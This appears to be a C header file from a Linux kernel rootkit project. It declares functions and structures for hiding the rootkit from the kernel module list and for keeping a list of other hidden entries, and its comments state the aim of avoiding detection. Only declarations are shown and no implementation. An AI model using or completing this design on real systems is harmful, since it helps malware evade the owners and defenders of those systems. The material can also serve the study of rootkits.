/**
 * @file hide.h
 * 
 * @brief Definitions for hiding the rootkit
 * 
 * This file contains the definitions for hiding the rootkit. The rootkit can be
 * hidden from the kernel module list to avoid detection.
 */

#ifndef _RK_HIDE_H
#define _RK_HIDE_H

// Variables to track the state of the rootkit hiding
static int hidden;

// Variable to store the previous module in the list
static struct list_head *prev_module;

/**
 * @brief A linked list structure to store hidden things
 * 
 * This structure is used to store hidden things in a linked list.
 */
struct hidden_list
{
    struct hidden_list *next;
    void *entry;
};

// The head of the hidden list
extern struct hidden_list *hidden_list_head;

/**
 * @brief Hide the rootkit from the kernel module list
 * 
 * This function hides the rootkit from the kernel module list to avoid detection.
 * 
 * @return 0 on success, -1 on failure
 */
int hide(void);

/**
 * @brief Unhide the rootkit from the kernel module list
 * 
 * This function unhides the rootkit from the kernel module list to allow the
 * rootkit to be removed.
 * 
 * @return 0 on success, -1 on failure
 */
int unhide(void);

/**
 * @brief Initialize the hidden list
 * 
 * This function initializes the hidden list by setting the head to NULL.
 */
void init_hidden_list(void);

/**
 * @brief Cleanup the hidden list
 * 
 * This function cleans up the hidden list by freeing the memory used by the
 * hidden_list structures.
 */
void cleanup_hidden_list(void);

/**
 * @brief Add an entry to the hidden list
 * 
 * This function adds an entry to the hidden list by creating a new hidden_list
 * structure and adding it to the list.
 * 
 * @param entry The entry to hide
 * 
 * @return 0 on success, -1 on failure
 */
int add_hidden_entry(void *entry);

/**
 * @brief Remove an entry from the hidden list
 * 
 * This function removes an entry from the hidden list by finding the entry in
 * the list and removing it.
 * 
 * @param entry The entry to reveal
 * 
 * @return 0 on success, -1 on failure
 */
int remove_hidden_entry(void *entry);

#endif // _RK_HIDE_H